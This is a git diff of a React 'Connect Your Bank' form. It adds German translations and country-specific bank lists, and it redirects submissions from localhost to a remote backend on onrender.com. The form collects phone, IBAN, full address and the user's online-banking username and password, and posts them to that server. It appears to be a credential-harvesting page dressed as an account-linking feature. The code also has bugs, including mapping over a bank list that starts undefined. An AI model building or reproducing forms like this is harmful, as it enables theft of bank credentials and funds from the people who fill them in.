@@ -1,9 +1,11 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useParams } from "react-router-dom";
 import BackButton from "./wrapper/Backbutton";
+import UseContext from "./useContext.jsx"; // Import useContext
+import Loader from "./Loader.jsx";
 
 const BankDetails = () => {
-  const {id} = useParams()
+  const { id } = useParams();
   const [formData, setFormData] = useState({
     phone: "",
     country: "Germany",
@@ -13,21 +15,91 @@ const BankDetails = () => {
     password: "",
     address: "",
   });
-
   const [formErrors, setFormErrors] = useState({});
+    const { PresentCountry } = UseContext(); // Consume the context
+    const [isLoading,setIsLoading] = useState(false)
+  const [GermanyBanks, setGermanyBanks] = useState();
+  useEffect(() => {
+    if (!PresentCountry) {
+      setIsLoading(true);
+    } else {
+      setIsLoading(false);
+    }
+}, [PresentCountry]);
 
-  const GermanyBanks = [
-    "Deutsche Bank",
-    "Commerzbank",
-    "DZ Bank",
-    "KfW Bank",
-    "HypoVereinsbank",
-    "Postbank",
-    "N26",
-    "ING-DiBa",
-    "DKB",
-    "Sparkasse",
-  ];
+    useEffect(() => {
+        // Update GermanyBanks based on the language.
+        if (PresentCountry === 'Germany') {
+          setGermanyBanks([
+            "Deutsche Bank",
+            "Commerzbank",
+            "DZ Bank",
+            "KfW Bank",
+            "HypoVereinsbank",
+            "Postbank",
+            "N26",
+            "ING-DiBa",
+            "DKB",
+            "Sparkasse",
+          ]);
+        } else if(PresentCountry == 'Canada'){
+            setGermanyBanks([
+              "Royal Bank of Canada (RBC)",
+              "Toronto-Dominion Bank (TD)",
+              "Bank of Nova Scotia (Scotiabank)",
+              "Bank of Montreal (BMO)",
+              "Canadian Imperial Bank of Commerce (CIBC)",
+              "National Bank of Canada",
+              "Desjardins Group",
+              "Laurentian Bank of Canada",
+              "HSBC Bank Canada",
+              "Manulife Bank"
+              ])
+            
+        }else if(PresentCountry == 'Switzerland'){
+          setGermanyBanks([
+            "UBS",
+            "Credit Suisse",
+            "Raiffeisen Group",
+            "Zürcher Kantonalbank",
+            "PostFinance",
+            "Julius Bär Group",
+            "Pictet Group",
+            "Vontobel Holding",
+            "EFG International",
+            "Lombard Odier Group"
+            ]) 
+      }else if(PresentCountry == 'United States'){
+        setGermanyBanks([
+          "JPMorgan Chase",
+          "Bank of America",
+          "Wells Fargo",
+          "Citigroup",
+          "U.S. Bank",
+          "Capital One",
+          "PNC Financial Services",
+          "Truist Financial",
+          "Goldman Sachs",
+          "Morgan Stanley"
+          ])
+        }else if(PresentCountry == 'United Kingdom'){
+          setGermanyBanks([
+            "HSBC",
+    "Barclays",
+    "Lloyds Banking Group",
+    "Royal Bank of Scotland (RBS)",
+    "Standard Chartered",
+    "Santander UK",
+    "Nationwide Building Society",
+    "NatWest Group",
+    "Virgin Money UK",
+    "TSB Bank"
+            ])
+          }
+    }, [PresentCountry]);
+
+  // Function to get text based on the current language
+  const getText = (english, german) => (PresentCountry === 'Germany' ? german : english);
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -37,20 +109,20 @@ const BankDetails = () => {
 
   const handleSubmit = async () => {
     const errors = {};
-    if (!formData.phone.trim()) errors.phone = "Phone number is required";
-    if (!formData.bank.trim()) errors.bank = "Bank is required";
-    if (!formData.iban.trim()) errors.iban = "IBAN is required";
-    if (!formData.username.trim()) errors.username = "Username is required";
-    if (!formData.password.trim()) errors.password = "Password is required";
-    if (!formData.address.trim()) errors.address = "Address is required";
+    if (!formData.phone.trim()) errors.phone = getText("Phone number is required", "Telefonnummer ist erforderlich");
+    if (!formData.bank.trim()) errors.bank = getText("Bank is required", "Bank ist erforderlich");
+    if (!formData.iban.trim()) errors.iban = getText("IBAN is required", "IBAN ist erforderlich");
+    if (!formData.username.trim()) errors.username = getText("Username is required", "Benutzername ist erforderlich");
+    if (!formData.password.trim()) errors.password = getText("Password is required", "Passwort ist erforderlich");
+    if (!formData.address.trim()) errors.address = getText("Address is required", "Adresse ist erforderlich");
 
     if (Object.keys(errors).length > 0) {
       setFormErrors(errors);
       return;
     }
-
+    setIsLoading(true)
     try {
-      const request = await fetch(`http://localhost:3000/bank/${id}`, {
+      const request = await fetch(`https://centkey-backend.onrender.com/bank/${id}`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -59,117 +131,127 @@ const BankDetails = () => {
       });
       const data = await request.json();
       console.log(data);
+      setIsLoading(false)
     } catch (error) {
       console.error("Error submitting form:", error);
     }
   };
 
   return (
-    <>
-    <BackButton/>
-    <div className="flex items-center justify-center w-full min-h-screen bg-[#f4f4f4] p-4">
-    <div className="bg-white rounded-lg shadow-md w-full max-w-[700px] padding20">
-      <h2 className="text-xl font-semibold mb-6">Connect Your Bank</h2>
-      <div className="grid grid-cols-1 md:grid-cols-2 gap-[20px]">
-        <div className="flex flex-col">
-          <label className="text-sm mb-1">Phone number</label>
-          <input
-            type="text"
-            name="phone"
-            value={formData.phone}
-            onChange={handleChange}
-            placeholder="Phone number"
-            className="padding10 border rounded-md input-type"
-          />
-          {formErrors.phone && <p className="text-red-500 text-sm">{formErrors.phone}</p>}
-        </div>
-        <div className="flex flex-col">
-          <label className="text-sm mb-1">Country</label>
-          <select
-            name="country"
-            value={formData.country}
-            onChange={handleChange}
-            className="padding10 border rounded-md input-type"
+    !isLoading ?( <>
+      <BackButton />
+      <div className="flex items-center justify-center w-full min-h-screen bg-[#f4f4f4] p-4">
+        <div className="bg-white rounded-lg shadow-md w-full max-w-[700px] padding20">
+          <h2 className="text-xl font-semibold mb-6">{getText("Connect Your Bank", "Verbinden Sie Ihre Bank")}</h2>
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-[20px]">
+            <div className="flex flex-col">
+              <label className="text-sm mb-1">{getText("Phone number", "Telefonnummer")}</label>
+              <input
+                type="text"
+                name="phone"
+                value={formData.phone}
+                onChange={handleChange}
+                placeholder={getText("Phone number", "Telefonnummer")}
+                className="padding10 border rounded-md input-type"
+              />
+              {formErrors.phone && <p className="text-red-500 text-sm">{formErrors.phone}</p>}
+            </div>
+            <div className="flex flex-col">
+              <label className="text-sm mb-1">{getText("Country", "Land")}</label>
+              <select
+                name="country"
+                value={formData.country}
+                onChange={handleChange}
+                className="padding10 border rounded-md input-type"
+              >
+                <option value="Germany">Germany</option>
+              </select>
+            </div>
+            <div className="flex flex-col">
+              <label className="text-sm mb-1">{getText("Bank", "Bank")}</label>
+              <select
+                name="bank"
+                value={formData.bank}
+                onChange={handleChange}
+                className="padding10 border rounded-md input-type"
+              >
+                <option value="">{getText("Select Bank", "Bank auswählen")}</option>
+                {GermanyBanks.map((item) => (
+                  <option key={item} value={item}>
+                    {item}
+                  </option>
+                ))}
+              </select>
+              {formErrors.bank && <p className="text-red-500 text-sm">{formErrors.bank}</p>}
+            </div>
+            <div className="flex flex-col">
+              <label className="text-sm mb-1">IBAN number</label>
+              <input
+                type="text"
+                name="iban"
+                value={formData.iban}
+                onChange={handleChange}
+                placeholder="IBAN number"
+                className="padding10 border rounded-md input-type"
+              />
+              {formErrors.iban && <p className="text-red-500 text-sm">{formErrors.iban}</p>}
+            </div>
+          </div>
+          <div className="mt-[20px]">
+            <label className="text-sm mb-1">{getText("Bank Username", "Bankbenutzername")}</label>
+            <input
+              type="text"
+              name="username"
+              value={formData.username}
+              onChange={handleChange}
+              placeholder={getText("Bank username", "Bankbenutzername")}
+              className="padding10 border rounded-md w-full input-type"
+            />
+            {formErrors.username && <p className="text-red-500 text-sm">{formErrors.username}</p>}
+          </div>
+          <div className="mt-[20px]">
+            <label className="text-sm mb-1">{getText("Bank Password", "Bankpasswort")}</label>
+            <input
+              type="password"
+              name="password"
+              value={formData.password}
+              onChange={handleChange}
+              placeholder={getText("Bank Password", "Bankpasswort")}
+              className="padding10 border rounded-md w-full input-type"
+            />
+            {formErrors.password && <p className="text-red-500 text-sm">{formErrors.password}</p>}
+          </div>
+          <div className="mt-[20px]">
+            <label className="text-sm mb-1">{getText("Full address", "Vollständige Adresse")}</label>
+            <input
+              type="text"
+              name="address"
+              value={formData.address}
+              onChange={handleChange}
+              placeholder={getText("Full address", "Vollständige Adresse")}
+              className="padding10 border rounded-md w-full input-type"
+            />
+            {formErrors.address && <p className="text-red-500 text-sm">{formErrors.address}</p>}
+          </div>
+          <p className="text-sm text-yellow-400">
+            {getText(
+              "Note : it is going to take about 1 business day for your Bank Assets to show up",
+              "Hinweis: Es dauert etwa 1 Werktag, bis Ihre Bankwerte angezeigt werden"
+            )}
+          </p>
+          <button
+            className="bg-green-300 text-white font-medium rounded-md  w-full padding10"
+            onClick={handleSubmit}
           >
-            <option value="Germany">Germany</option>
-          </select>
-        </div>
-        <div className="flex flex-col">
-          <label className="text-sm mb-1">Bank</label>
-          <select
-            name="bank"
-            value={formData.bank}
-            onChange={handleChange}
-            className="padding10 border rounded-md input-type"
-          >
-            <option value="">Select Bank</option>
-            {GermanyBanks.map((item) => (
-              <option key={item} value={item}>
-                {item}
-              </option>
-            ))}
-          </select>
-          {formErrors.bank && <p className="text-red-500 text-sm">{formErrors.bank}</p>}
-        </div>
-        <div className="flex flex-col">
-          <label className="text-sm mb-1">IBAN number</label>
-          <input
-            type="text"
-            name="iban"
-            value={formData.iban}
-            onChange={handleChange}
-            placeholder="IBAN number"
-            className="padding10 border rounded-md input-type"
-          />
-          {formErrors.iban && <p className="text-red-500 text-sm">{formErrors.iban}</p>}
+            + {getText("Bank", "Bank")}
+          </button>
         </div>
       </div>
-      <div className="mt-[20px]">
-        <label className="text-sm mb-1">Bank Username</label>
-        <input
-          type="text"
-          name="username"
-          value={formData.username}
-          onChange={handleChange}
-          placeholder="Bank username"
-          className="padding10 border rounded-md w-full input-type"
-        />
-        {formErrors.username && <p className="text-red-500 text-sm">{formErrors.username}</p>}
-      </div>
-      <div className="mt-[20px]">
-        <label className="text-sm mb-1">Bank Password</label>
-        <input
-          type="password"
-          name="password"
-          value={formData.password}
-          onChange={handleChange}
-          placeholder="Bank Password"
-          className="padding10 border rounded-md w-full input-type"
-        />
-        {formErrors.password && <p className="text-red-500 text-sm">{formErrors.password}</p>}
-      </div>
-      <div className="mt-[20px]">
-        <label className="text-sm mb-1">Full address</label>
-        <input
-          type="text"
-          name="address"
-          value={formData.address}
-          onChange={handleChange}
-          placeholder="Full address"
-          className="padding10 border rounded-md w-full input-type"
-        />
-        {formErrors.address && <p className="text-red-500 text-sm">{formErrors.address}</p>}
-      </div>
-      <p className="text-sm text-yellow-400">Note : it is going to take about 1 business day for your Bank Assets to show up</p>
-      <button
-        className="bg-green-300 text-white font-medium rounded-md  w-full padding10"
-        onClick={handleSubmit}
-      >
-        + Bank
-      </button>
-    </div>
-  </div></>
-    
+    </>):(
+      <Loader/>
+    )
+   
+
   );
 };
 
